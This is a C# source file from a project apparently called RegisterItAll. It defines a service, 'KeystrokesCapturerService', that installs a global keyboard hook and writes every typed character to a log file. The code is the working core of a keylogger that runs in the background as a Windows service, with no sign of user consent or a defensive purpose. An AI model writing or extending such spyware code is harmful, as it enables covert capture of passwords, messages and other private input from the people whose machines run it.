using Gma.System.MouseKeyHook;
using RegisterItAll.Managers;
using RegisterItAll.Services.Base;
using System.Windows.Forms;

namespace RegisterItAll.Services
{
    public partial class KeystrokesCapturerService : ExecutableAsConsoleApplicationService
    {
        protected override void OnStart(string[] args)
        {
            IKeyboardMouseEvents hook = Hook.GlobalEvents();

            hook.KeyPress += OnKeyPressed;

            Application.Run();
        }

        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
        {
            FilesManager.SaveLog(args.KeyChar.ToString());
        }
    }
}